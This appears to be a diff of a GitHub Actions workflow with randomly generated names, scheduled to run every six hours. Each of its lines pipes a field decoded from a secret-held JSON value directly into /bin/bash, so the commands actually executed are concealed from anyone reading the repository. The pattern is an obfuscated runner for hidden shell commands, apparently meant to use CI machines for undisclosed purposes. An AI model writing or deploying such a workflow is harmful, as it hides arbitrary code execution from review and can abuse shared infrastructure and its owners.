@@ -2,8 +2,9 @@ name: lantoufufk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
-jobs:  # 2118
+    - cron: '28 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +12,11 @@ jobs:  # 2118
       - uses: actions/checkout@v4
       - name: lantoufufk
         env:
-          ztuqd12789: ${{ secrets.ztuqd12789 }}
+          jltd580: ${{ secrets.jltd580 }}
         run: |
-          echo $ztuqd12789 | jq -r .the726 | /bin/bash
-          echo $vx04 | jq -r .cmkw37711 | /bin/bash
-          echo $ltid356 | jq -r .kgpzo87098 | /bin/bash
-          echo $d6 | jq -r .ndvb2256 | /bin/bash
-          echo $qne33 | jq -r .hbza51201 | /bin/bash
-          echo $fpf122 | jq -r .q7 | /bin/bash
-          echo $lbee90055 | jq -r .ctzct7629 | /bin/bash
-          echo $bwbv438 | jq -r .dyl5875 | /bin/bash
-          echo $fd858 | jq -r .zzlh9 | /bin/bash
-          echo $rfo050 | jq -r .pa43 | /bin/bash
-          echo $ta344 | jq -r .sah8541 | /bin/bash
+          echo $jltd580 | jq -r .yzeo42987 | /bin/bash
+          echo $naf706 | jq -r .zcful5 | /bin/bash
+          echo $hrt55311 | jq -r .rsyvr4665 | /bin/bash
+          echo $dxhbq14738 | jq -r .lby8 | /bin/bash
+          echo $ppp33992 | jq -r .let7 | /bin/bash
 
